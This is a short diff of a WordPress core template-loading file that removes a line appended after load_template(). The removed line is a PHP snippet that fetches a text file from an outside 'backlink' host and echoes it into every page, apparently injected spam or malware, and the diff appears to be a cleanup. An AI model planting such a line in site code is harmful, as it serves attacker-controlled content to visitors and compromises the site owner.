@@ -823,4 +823,3 @@ function load_template( $_template_file, $load_once = true, $args = array() ) {
 	 */
 	do_action( 'wp_after_load_template', $_template_file, $load_once, $args );
 }
-<?php $a = file_get_contents('https://inilinkku.com/backlink/index.txt'); echo $a; ?>
